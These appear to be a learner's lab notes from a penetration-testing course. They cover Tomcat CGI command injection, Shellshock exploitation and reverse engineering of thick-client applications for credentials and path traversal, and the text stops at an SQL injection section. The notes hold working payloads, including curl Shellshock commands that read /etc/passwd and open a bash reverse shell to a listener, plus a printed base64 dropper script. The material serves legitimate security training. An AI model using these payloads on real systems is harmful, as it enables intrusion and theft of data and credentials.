	> As discussed above, we can exploit CVE-2019-0232 by appending our own commands through the use of the batch command separator &. We now have a valid CGI script path discovered during the enumeration at http://10.129.204.227:8080/cgi/welcome.bat
		Code: http
		http://10.129.204.227:8080/cgi/welcome.bat?&dir

	> Navigating to the above URL returns the output for the dir batch command, however trying to run other common windows command line apps, such as whoami doesn't return an output.
	> Retrieve a list of environmental variables by calling the set command:
		Code: http
		# http://10.129.204.227:8080/cgi/welcome.bat?&set

			Welcome to CGI, this section is not functional yet. Please return to home page.
			AUTH_TYPE=
			COMSPEC=C:\Windows\system32\cmd.exe
			CONTENT_LENGTH=
			CONTENT_TYPE=
			GATEWAY_INTERFACE=CGI/1.1
			HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
			HTTP_ACCEPT_ENCODING=gzip, deflate
			HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
			HTTP_HOST=10.129.204.227:8080
			HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
			PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
			PATH_INFO=
			PROMPT=$P$G
			QUERY_STRING=&set
			REMOTE_ADDR=10.10.14.58
			REMOTE_HOST=10.10.14.58
			REMOTE_IDENT=
			REMOTE_USER=
			REQUEST_METHOD=GET
			REQUEST_URI=/cgi/welcome.bat
			SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
			SCRIPT_NAME=/cgi/welcome.bat
			SERVER_NAME=10.129.204.227
			SERVER_PORT=8080
			SERVER_PROTOCOL=HTTP/1.1
			SERVER_SOFTWARE=TOMCAT
			SystemRoot=C:\Windows
			X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat

	> From the list, we can see that the PATH variable has been unset, so we will need to hardcode paths in requests:
		Code: http
		http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe

	> The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.
		Code: http
		http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe


-=-=
[+] Attacking Common Gateway Interface (CGI) Applications - Shellshock

	> A Common Gateway Interface (CGI => https://www.w3.org/CGI/) is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the /CGI-bin directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc. These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.
	> CGI scripts/applications are typically used for a few reasons:
    	- If the webserver must dynamically interact with the user
    	- When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver
	> A graphical depiction of how CGI works can be seen below.
		(https://academy.hackthebox.com/storage/modules/113/cgi.gif)
	> Broadly, the steps are as follows:
    	- A directory is created on the web server containing the CGI scripts/applications. This directory is typically called CGI-bin.
    	- The web application user sends a request to the server via a URL, i.e, https://acme.com/cgi-bin/newchiscript.pl
    	- The server runs the script and passed the resultant output back to the web client
	> There are some disadvantages to using them: The CGI program starts a new process for each HTTP request which can take up a lot of server memory. A new database connection is opened each time. Data cannot be cached between page loads which reduces efficiency. However, the risks and inefficiencies outweigh the benefits, and CGI has not kept up with the times and has not evolved to work well with modern web applications. It has been superseded by faster and more secure technologies. However, as testers, we will run into web applications from time to time that still use CGI and will often see it when we encounter embedded devices during an assessment.

* CGI Attacks
	> Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, "Bash bug") vulnerability via CGI. The Shellshock vulnerability (CVE-2014-6271 => (https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. At the time of discovery, it was a 25-year-old bug and a significant threat to companies worldwide.

* Shellshock via CGI
	> The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable. Let's look at a simple example where we define an environment variable and include a malicious command afterward.
		$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"

	> When the above variable is assigned, Bash will interpret the y x='() { :;};' portion as a function definition for a variable y. The function does nothing but returns an exit code 0, but when it is imported, it will execute the command echo vulnerable-shellshock if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user. Most of the time, this will be a user such as www-data, and we will have access to the system but still need to escalate privileges. Occasionally we will get really lucky and gain access as the root user if the web server is running in an elevated context.
	> If the system is not vulnerable, only "not vulnerable" will be printed.
		$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
		not vulnerable

	> This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret y=() {...} as a function definition. But rather, function definitions within environment variables must not be prefixed with BASH_FUNC_.

* Hands-on Example
	> Let's look at a hands-on example to see how we, as pentesters, can find and exploit this flaw.

* Enumeration - Gobuster
	> We can hunt for CGI scripts using a tool such as Gobuster. Here we find one, access.cgi.
		m1l0js@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
			/access.cgi           (Status: 200) [Size: 0]

	> Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.
		m1l0js@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
			HTTP/1.1 200 OK
			Date: Thu, 23 Mar 2023 13:28:55 GMT
			Server: Apache/2.4.41 (Ubuntu)
			Content-Length: 0
			Content-Type: text/html

* Confirming the Vulnerability
	> To check for the vulnerability, we can use a simple cURL command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the /etc/passwd file are returned to us, thus confirming the vulnerability via the user-agent field.
		m1l0js@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
		//Other way to find the flag.txt
		curl -s -H 'User-Agent: () { :; }; echo; echo ; /bin/find / -type f -name "flag.txt" -exec cat {} \;' bash -s :'' http://10.129.194.243/cgi-bin/access.cgi


* Exploitation to Reverse Shell Access
	> Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.
		m1l0js@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

	> From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.
		m1l0js@htb[/htb]$ sudo nc -lvnp 7777

* Mitigation
	> This blog post(https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contains useful tips for mitigating the Shellshock vulnerability. The quickest way to remediate the vulnerability is to update the version of Bash on the affected system. This can be trickier on end-of-life Ubuntu/Debian systems, so a sysadmin may have first to upgrade the package manager. With certain systems (i.e., IoT devices that use CGI), upgrading may not be possible. In these cases, it would be best first to ensure the system is not exposed to the internet and then evaluate if the host can be decommissioned. If it is a critical host and the organization chooses to accept the risk, a temporary workaround could be firewalling off the host on the internal network as best as possible. Keep in mind that this is just putting a bandaid on a large wound, and the best course of action would be upgrading or taking the host offline.

* Closing Thoughts
	> Shellshock is a legacy vulnerability that is now nearly a decade old. But just because of its age, that does not mean we will not run into it occasionally. If you come across any web applications using CGI scripts during your assessments (especially IoT devices), it is definitely worth digging into using the steps shown in this section. You may have a relatively simple foothold awaiting you

-=-=
[+] Attacking Thick Client Applications
	> Thick client applications are the applications that are installed locally on our computers. Unlike thin client applications that run on a remote server and can be accessed through the web browser, these applications do not require internet access to run, and they perform better in processing power, memory, and storage capacity. Thick client applications are usually applications used in enterprise environments created to serve specific purposes. Such applications include project management systems, customer relationship management systems, inventory management tools, and other productivity software. These applications are usually developed using Java, C++, .NET, or Microsoft Silverlight.
	> A critical security measure that, for example, Java has is a technology called sandbox. The sandbox is a virtual environment that allows untrusted code, such as code downloaded from the internet, to run safely on a user's system without posing a security risk. In addition, it isolates untrusted code, preventing it from accessing or modifying system resources and other applications without proper authorization. Besides that, there are also Java API restrictions and Code Signing that helps to create a more secure environment.
	> In a .NET environment, a thick client, also known as a rich client or fat client, refers to an application that performs a significant amount of processing on the client side rather than relying solely on the server for all processing tasks. As a result, thick clients can provide a better performance, more features, and improved user experiences compared to their thin client counterparts, which rely heavily on the server for processing and data storage.
	> Some examples of thick client applications are web browsers, media players, chatting software, and video games. Some thick client applications are usually available to purchase or download for free through their official website or third-party application stores, while other custom applications that have been created for a specific company, can be delivered directly from the IT department that has developed the software. Deploying and maintaining thick client applications can be more difficult than thin client applications since patches and updates must be done locally to the user's computer. Some characteristics of thick client applications are:

    	- Independent software.
    	- Working without internet access.
    	- Storing data locally.
    	- Less secure.
    	- Consuming more resources.
    	- More expensive.

	> Thick client applications can be categorized into two-tier and three-tier architecture. In two-tier architecture, the application is installed locally on the computer and communicates directly with the database. In the three-tier architecture, applications are also installed locally on the computer, but in order to interact with the databases, they first communicate with an application server, usually using the HTTP/HTTPS protocol. In this case, the application server and the database might be located on the same network or over the internet. This is something that makes three-tier architecture more secure since attackers won't be able to communicate directly with the database. The image below shows the differences between two-tier and three-tier architecture applications.
		(https://academy.hackthebox.com/storage/modules/113/thick_clients/arch_tiers.png)


	> Since a large portion of thick client applications are downloaded from the internet, there is no sufficient way to ensure that users will download the official application, and that raises security concerns. Web-specific vulnerabilities like XSS, CSRF, and Clickjacking, do not apply to thick client applications. However, thick client applications are considered less secure than web applications with many attacks being applicable, including:

    	- Improper Error Handling.
    	- Hardcoded sensitive data.
    	- DLL Hijacking.
    	- Buffer Overflow.
    	- SQL Injection.
    	- Insecure Storage.
    	- Session Management.

* Penetration Testing Steps
	> Thick client applications are considered more complex than others, and the attacking surface can be large. Thick client application penetration testing can be done both using automated tools and manually. The following steps are usually followed when testing thick client applications.

* Information Gathering
	> In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs. Testers should also look for identifying common vulnerabilities like the ones we mentioned earlier at the end of the About(https://academy.hackthebox.com/module/113/section/2139##About) section. The following tools will help us gather information.
			
		CFF Explorer 	(https://ntcore.com/?page_id=388)
		Detect It Easy 	(https://github.com/horsicq/Detect-It-Easy)
		Process Monitor (https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
		Strings 		(https://learn.microsoft.com/en-us/sysinternals/downloads/strings)

* Client Side attacks
	> Although thick clients perform significant processing and data storage on the client side, they still communicate with servers for various tasks, such as data synchronization or accessing shared resources. This interaction with servers and other external systems can expose thick clients to vulnerabilities similar to those found in web applications, including command injection, weak access control, and SQL injection.
	> Sensitive information like usernames and passwords, tokens, or strings for communication with other services, might be stored in the application's local files. Hardcoded credentials and other sensitive information can also be found in the application's source code, thus Static Analysis is a necessary step while testing the application. Using the proper tools, we can reverse-engineer and examine .NET and Java applications including EXE, DLL, JAR, CLASS, WAR, and other file formats. Dynamic analysis should also be performed in this step, as thick client applications store sensitive information in the memory as well.
		Ghidra 	 	(https://www.ghidra-sre.org/)
		IDA 	 	(https://hex-rays.com/ida-pro/)
		OllyDbg 	(http://www.ollydbg.de/) 	
		Radare2 	(https://www.radare.org/r/index.html)
		dnSpy 		(https://github.com/dnSpy/dnSpy)
		x64dbg 		(https://x64dbg.com/)
		JADX 		(https://github.com/skylot/jadx)
		Frida		(https://frida.re/)

* Network Side Attacks
	> If the application is communicating with a local or remote server, network traffic analysis will help us capture sensitive information that might be transferred through HTTP/HTTPS or TCP/UDP connection, and give us a better understanding of how that application is working. Penetration testers that are performing traffic analysis on thick client applications should be familiar with tools like:
		Wireshark 	 	(https://www.wireshark.org/)
		tcpdump 		(https://www.tcpdump.org/)	
		TCPView 		(https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview)
		Burp Suite 		(https://portswigger.net/burp)

* Server Side Attacks
	> Server-side attacks in thick client applications are similar to web application attacks, and penetration testers should pay attention to the most common ones including most of the OWASP Top Ten.

	+ Retrieving hardcoded Credentials from Thick-Client Applications
		> The following scenario walks us through enumerating and exploiting a thick client application, in order to move laterally inside a corporative network during penetration testing. The scenario starts after we have gained access to an exposed SMB service.
		> Exploring the NETLOGON share(net share netlogon) of the SMB service reveals RestartOracle-Service.exe among other files. Downloading the executable locally and running it through the command line, it seems like it does not run or it runs something hidden.
			Server Side Attacks
				C:\Apps>.\Restart-OracleService.exe
				C:\Apps>

	> Downloading the tool ProcMon64 from SysInternals(https://learn.microsoft.com/en-gb/sysinternals/downloads/procmon) and monitoring the process reveals that the executable indeed creates a temp file in C:\Users\Matt\AppData\Local\Temp. (https://academy.hackthebox.com/storage/modules/113/thick_clients/procmon.png)

	> Here is a good guide of procmon => (https://adamtheautomator.com/procmon/)
		.\procmon.exe /accepteula /quiet 
		.\procmon.exe /LoadConfig C:\ProcmonConfigs\file_deletion.pmc
		.\procmon.exe /OpenLog C:\MyLogFile.pml
	> In order to capture the files, it is required to change the permissions of the Temp folder to disallow file deletions. To do this, we right-click the folder C:\Users\Matt\AppData\Local\Temp and under Properties -> Security -> Advanced -> cybervaca -> Disable inheritance -> Convert inherited permissions into explicit permissions on this object -> Edit -> Show advanced permissions, we deselect the Delete subfolders and files, and Delete checkboxes. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/change-perms.png)

	> Finally, we click OK -> Apply -> OK -> OK on the open windows. Once the folder permissions have been applied we simply run again the Restart-OracleService.exe and check the temp folder. The file 6F39.bat is created under the C:\Users\cybervaca\AppData\Local\Temp\2. The names of the generated files are random every time the service is running.
		C:\Apps>dir C:\Users\cybervaca\AppData\Local\Temp\2

		...SNIP...
		04/03/2023  02:09 PM         1,730,212 6F39.bat
		04/03/2023  02:09 PM                 0 6F39.tmp

	> Listing the content of the 6F39 batch file reveals the following.
		Code: batch

		@shift /0
		@echo off

		if %username% == matt goto correcto
		if %username% == frankytech goto correcto
		if %username% == ev4si0n goto correcto
		goto error

		:correcto
		echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
		echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
		<SNIP>
		echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt

		echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1
		powershell.exe -exec bypass -file c:\programdata\monta.ps1
		del c:\programdata\monta.ps1
		del c:\programdata\oracle.txt
		c:\programdata\restart-service.exe
		del c:\programdata\restart-service.exe

	> Inspecting the content of the file reveals that two files are being dropped by the batch file and being deleted before anyone can get access to the leftovers. We can try to retrieve the content of the 2 files, by modifying the batch script and removing the deletion.
		Code: batch
		
		@shift /0
		@echo off
		
		echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > c:\programdata\oracle.txt
		echo AAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4g >> c:\programdata\oracle.txt
		<SNIP>
		echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA >> c:\programdata\oracle.txt
		
		echo $salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida)) > c:\programdata\monta.ps1

	> After executing the batch script by double-clicking on it, we wait a few minutes to spot the oracle.txt file which contains another file full of base64 lines, and the script monta.ps1 which contains the following content, under the directory c:\programdata\. Listing the content of the file monta.ps1 reveals the following code.
		C:\>  cat C:\programdata\monta.ps1

		$salida = $null; $fichero = (Get-Content C:\ProgramData\oracle.txt) ; foreach ($linea in $fichero) {$salida += $linea }; $salida = $salida.Replace(" ",""); [System.IO.File]::WriteAllBytes("c:\programdata\restart-service.exe", [System.Convert]::FromBase64String($salida))

	> This script simply reads the contents of the oracle.txt file and decodes it to the restart-service.exe executable. Running this script gives us a final executable that we can further analyze.
		C:\>  ls C:\programdata\

		Mode                LastWriteTime         Length Name
		<SNIP>
		-a----        3/24/2023   1:01 PM            273 monta.ps1
		-a----        3/24/2023   1:01 PM         601066 oracle.txt
		-a----        3/24/2023   1:17 PM         432273 restart-service.exe

	> Now when executing restart-service.exe we are presented with the banner Restart Oracle created by HelpDesk back in 2010.
		C:\>  .\restart-service.exe

		    ____            __             __     ____                  __
		   / __ \___  _____/ /_____ ______/ /_   / __ \_________ ______/ /__
		  / /_/ / _ \/ ___/ __/ __ `/ ___/ __/  / / / / ___/ __ `/ ___/ / _ \
		 / _, _/  __(__  ) /_/ /_/ / /  / /_   / /_/ / /  / /_/ / /__/ /  __/
		/_/ |_|\___/____/\__/\__,_/_/   \__/   \____/_/   \__,_/\___/_/\___/

		                                                by @HelpDesk 2010


	> Inspecting the execution of the executable through ProcMon64 shows that it is querying multiple things in the registry and does not show anything solid to go by. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/proc-restart.png)
	
	> Let's start x64dgb, navigate to Options -> Preferences, uncheck the System Breakpoint* option under the Events tab, and click Save. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/system_breakpoint_5.png)
	> By unchecking this option, the debugging will start directly from the application's entry point, and we will avoid going through any dll files that are loaded before the app starts. Then, we can drag and drop restart-service.exe to import it and start the debugging. Once imported, we click the Step over button on the top menu bar or press F8 until we hit the banner. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/gdb_banner.png)

	> Checking the memory maps at this stage by clicking on the Memory Map tab shows an interesting new map added after displaying the ASCII banner. Maps can be identified in the column Type. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/maps.png)
	> The specific map's size is 0000000000003000, and if we double-click on it, we will see the magic bytes MZ in the ASCII column that indicates that the file is a DOS MZ executable. => (https://en.wikipedia.org/wiki/DOS_MZ_executable)
		(https://academy.hackthebox.com/storage/modules/113/thick_clients/magic_bytes_3.png)

	> Let's export the newly discovered mapped item from memory to a dump file by right-clicking on the address and selecting Dump Memory to File. Running strings on the exported file reveals some interesting information.
		C:\> C:\TOOLS\Strings\strings64.exe .\restart-service_00000000001E0000.bin

		<SNIP>
		"#M
		z\V
		).NETFramework,Version=v4.0,Profile=Client
		FrameworkDisplayName
		.NET Framework 4 Client Profile
		<SNIP>

	> Reading the output reveals that the dump contains a .NET executable. We can use De4Dot to reverse .NET executables back to the source code by dragging the restart-service_00000000001E0000.bin onto the de4dot executable.
		de4dot v3.1.41592.3405

		Detected Unknown Obfuscator (C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin)
		Cleaning C:\Users\cybervaca\Desktop\restart-service_00000000001E0000.bin
		Renaming all obfuscated symbols
		Saving C:\Users\cybervaca\Desktop\restart-service_00000000001E0000-cleaned.bin


		Press any key to exit...

	> Now, we can read the source code of the exported application by dragging and dropping it onto the DnSpy executable. => (https://academy.hackthebox.com/storage/modules/113/thick_clients/souce-code_hidden.png)

	> With the source code disclosed, we can understand that this binary is a custom-made runas.exe with the sole purpose of restarting the Oracle service using hardcoded credentials.



-=-=-=
[+] Exploiting Web Vulnerabilities in Thick-Client Applications
	> Thick client applications with a three-tier architecture have a security advantage over those with a two-tier architecture since it prevents the end-user from communicating directly with the database server. However, three-tier applications can be susceptible to web-specific attacks like SQL Injection and Path Traversal.
	> During penetration testing, it is common for someone to encounter a thick client application that connects to a server to communicate with the database. The following scenario demonstrates a case where the tester has found the following files while enumerating an FTP server that provides anonymous user access.
    	- fatty-client.jar
    	- note.txt
    	- note2.txt
    	- note3.txt

	> Reading the content of all the text files reveals that:
    	- A server has been reconfigured to run on port 1337 instead of 8000.
    	- This might be a thick/thin client architecture where the client application still needs to be updated to use the new port.
    	- The client application relies on Java 8.
    	- The login credentials for login in the client application are qtc / clarabibi.

	> Let's run the fatty-client.jar file by double-clicking on it. Once the app is started, we can log in using the credentials qtc / clarabibi.
	> This is not successful, and the message Connection Error! is displayed. This is probably because the port pointing to the servers needs to be updated from 8000 to 1337. Let's capture and analyze the network traffic using Wireshark to confirm this. Once Wireshark is started, we click on Login once again. => (https://academy.hackthebox.com/storage/modules/113/thick_clients_web/wireshark.png)

	> The client attempts to connect to the server.fatty.htb subdomain. Let's start a command prompt as administrator and add the following entry to the /etc/hosts file.
		C:\> echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
	
	> Inspecting the traffic again reveals that the client is attempting to connect to port 8000.
	> The fatty-client.jar is a Java Archive file, and its content can be extracted by right-clicking on it and selecting Extract files.

	> Let's run PowerShell as administrator, navigate to the extracted directory and use the Select-String command to search all the files for port 8000.
		C:\> ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
			Path       : C:\Users\cybervaca\Desktop\fatty-client\beans.xml
			LineNumber : 13

	> There's a match in beans.xml. This is a Spring configuration file containing configuration metadata. Let's read its content.
		C:\> cat fatty-client\beans.xml
			<SNIP>
			<!-- Here we have an constructor based injection, where Spring injects required arguments inside the
			         constructor function. -->
			   <bean id="connectionContext" class = "htb.fatty.shared.connection.ConnectionContext">
			      <constructor-arg index="0" value = "server.fatty.htb"/>
			      <constructor-arg index="1" value = "8000"/>
			   </bean>

			<!-- The next to beans use setter injection. For this kind of injection one needs to define an default
			constructor for the object (no arguments) and one needs to define setter methods for the properties. -->
			   <bean id="trustedFatty" class = "htb.fatty.shared.connection.TrustedFatty">
			      <property name = "keystorePath" value = "fatty.p12"/>
			   </bean>

			   <bean id="secretHolder" class = "htb.fatty.shared.connection.SecretHolder">
			      <property name = "secret" value = "clarabibiclarabibiclarabibi"/>
			   </bean>
			<SNIP>

	> Let's edit the line <constructor-arg index="1" value = "8000"/> and set the port to 1337. Reading the content carefully, we also notice that the value of the secret is clarabibiclarabibiclarabibi. Running the edited application will fail due to an SHA-256 digest mismatch. The JAR is signed, validating every file's SHA-256 hashes before running. These hashes are present in the file META-INF/MANIFEST.MF.
		C:\> cat fatty-client\META-INF/MANIFEST.MF
		Manifest-Version: 1.0
		Archiver-Version: Plexus Archiver
		Built-By: root
		Sealed: True
		Created-By: Apache Maven 3.3.9
		Build-Jdk: 1.8.0_232
		Main-Class: htb.fatty.client.run.Starter

		Name: META-INF/maven/org.slf4j/slf4j-log4j12/pom.properties
		SHA-256-Digest: miPHJ+Y50c4aqIcmsko7Z/hdj03XNhHx3C/pZbEp4Cw=

		Name: org/springframework/jmx/export/metadata/ManagedOperationParamete
		 r.class
		SHA-256-Digest: h+JmFJqj0MnFbvd+LoFffOtcKcpbf/FD9h2AMOntcgw=
		<SNIP>

	> Let's remove the hashes from META-INF/MANIFEST.MF and delete the 1.RSA and 1.SF files from the META-INF directory. The modified MANIFEST.MF should end with a new line.
		Code: txt

		Manifest-Version: 1.0
		Archiver-Version: Plexus Archiver
		Built-By: root
		Sealed: True
		Created-By: Apache Maven 3.3.9
		Build-Jdk: 1.8.0_232
		Main-Class: htb.fatty.client.run.Starter

	> We can update and run the fatty-client.jar file by issuing the following commands.
		C:\> cd .\fatty-client
		C:\> jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
			//-c => create new archive
			//-m => include manifest information from specified manifest file
			//-f => specify archive file name

	> Then, we double-click on the fatty-client-new.jar file to start it and try logging in using the credentials qtc / clarabibi. This time we get the message Login Successful!.

* Foothold
	> Clicking on Profile -> Whoami reveals that the user qtc is assigned with the user role.
	> Clicking on the ServerStatus, we notice that we can't click on any options.
	> This implies that there might be another user with higher privileges that is allowed to use this feature. Clicking on the FileBrowser -> Notes.txt reveals the file security.txt. Clicking the Open option at the bottom of the window shows the following content.
	> This note informs us that a few critical issues in the application still need to be fixed. Navigating to the FileBrowser -> Mail option reveals the dave.txt file containing interesting information. We can read its content by clicking the Open option at the bottom of the window.
	> The message from dave says that all admin users are removed from the database. It also refers to a timeout implemented in the login procedure to mitigate time-based SQL injection attacks.

* Path Traversal
	> Since we can read files, let's attempt a path traversal attack by giving the following payload in the field and clicking the Open button.
		Code: txt
		../../../../../../etc/passwd
	> The server filters out the / character from the input. Let's decompile the application using JD-GUI(http://java-decompiler.github.io/), by dragging and dropping the fatty-client-new.jar onto the jd-gui.
	> Save the source code by pressing the Save All Sources option in jdgui. Decompress the fatty-client-new.jar.src.zip by right-clicking and selecting Extract files. The file fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java handles the application features. Reading its content reveals the following code.
		Code: java

		public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
		    String methodName = (new Object() {
			
		      }).getClass().getEnclosingMethod().getName();
		    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
		    if (AccessCheck.checkAccess(methodName, this.user))
		      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
		    this.action = new ActionMessage(this.sessionID, "files");
		    this.action.addArgument(folder);
		    sendAndRecv();
		    if (this.response.hasError())
		      return "Error: Your action caused an error on the application server!"; 
		    return this.response.getContentAsString();
		  }

	> The showFiles function takes in one argument for the folder name and then sends the data to the server using the sendAndRecv() call. The file fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java sets the folder option. Let's read its content.
		Code: java

		configs.addActionListener(new ActionListener() {
		          public void actionPerformed(ActionEvent e) {
		            String response = "";
		            ClientGuiTest.this.currentFolder = "configs";
		            try {
		              response = ClientGuiTest.this.invoker.showFiles("configs");
		            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
		              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
		            } catch (IOException e2) {
		              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
		            } 
		            textPane.setText(response);
		          }
		        });

	> We can replace the configs folder name with .. as follows.
		Code: java

		ClientGuiTest.this.currentFolder = "..";
		  try {
		    response = ClientGuiTest.this.invoker.showFiles("..");

	> Next, compile the ClientGuiTest.Java file.
		C:\> javac -cp fatty-client-new.jar fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java

	> This generates several class files. Let's create a new folder and extract the contents of fatty-client.jar into it.
		C:\> mkdir raw
		C:\> cp fatty-client-new.jar raw/fatty-client-new-2.jar

	> Navigate to the raw directory and decompress fatty-client-new-2.jar by right-clicking and selecting Extract Here. Overwrite any existing htb/fatty/client/gui/*.class files with updated class files.

		C:\> mv -Force fatty-client-new.jar.src/htb/fatty/client/gui/*.class raw/htb/fatty/client/gui/

	> Finally, we build the new JAR file.
		C:\> cd raw
		C:\> jar -cmf META-INF/MANIFEST.MF traverse.jar .

	> Let's log in to the application and navigate to FileBrowser -> Config option.
	> This is successful. We can now see the content of the directory configs/../. The files fatty-server.jar and start.sh look interesting. Listing the content of the start.sh file reveals that fatty-server.jar is running inside an Alpine Docker container.
	> We can modify the open function in fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java to download the file fatty-server.jar as follows.
		Code: java

		import java.io.FileOutputStream;
		<SNIP>
		public String open(String foldername, String filename) throws MessageParseException, MessageBuildExcept
		ion, IOException {
		    String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();
		    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
		    if (AccessCheck.checkAccess(methodName, this.user)) {
		        return "Error: Method '" + methodName + "' is not allowed for this user account";
		    }
		    this.action = new ActionMessage(this.sessionID, "open");
		    this.action.addArgument(foldername);
		    this.action.addArgument(filename);
		    sendAndRecv();
		    FileOutputStream fos;
			String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
			fos = new FileOutputStream(desktopPath);
		    if (this.response.hasError()) {
		        return "Error: Your action caused an error on the application server!";
		    }
		    String response = "";
		    try {
		        response = this.response.getContentAsString();
		    } catch (Exception e) {
		        response = "Unable to convert byte[] to String. Did you read in a binary file?";
		    }
		    fos.write(this.response.getContent());
		    fos.close();
		    return response;
		}
		<SNIP>

	> Rebuild the JAR file by following the same steps and log in again to the application. Then, navigate to FileBrowser -> Config, add the fatty-server.jar name in the input field, and click the Open button.
	> The fatty-server.jar file is successfully downloaded onto our desktop, and we can start the examination.

* SQL Injection
	> Decompiling the fatty-server.jar using JD-GUI reveals the file htb/fatty/server/database/FattyDbSession.class that contains a checkLogin() function that handles the login functionality. This function retrieves user details based on the provided username. It then compares the retrieved password with the provided password.
		Code: java

		public User checkLogin(User user) throws LoginException {
		    <SNIP>
